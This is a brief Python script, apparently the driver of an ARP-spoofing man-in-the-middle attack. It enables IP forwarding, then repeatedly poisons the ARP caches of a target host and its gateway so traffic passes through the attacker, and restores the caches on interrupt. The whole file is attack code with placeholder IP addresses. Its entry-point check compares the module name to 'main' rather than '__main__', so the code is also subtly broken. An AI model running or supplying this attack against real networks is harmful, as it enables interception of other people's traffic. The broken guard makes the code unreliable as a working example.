from spoofing_services import *
import time


if __name__ == "main":
    target_ip = "some ip"
    gateway_ip = "another ip"
    enableIPRoute()

    try:
        while True:
            spoof(target_ip, gateway_ip)    # lie to the target saying that we are the gateway
            spoof(gateway_ip, target_ip)    # lie to the gateway saying that we are the target
            time.sleep(1)
    except KeyboardInterrupt:
        print("Restoring the network, please wait...")
        unspoof(target_ip, gateway_ip)  # tell the target who the gateway really is
        unspoof(gateway_ip, target_ip)  # tell the gateway who the target really is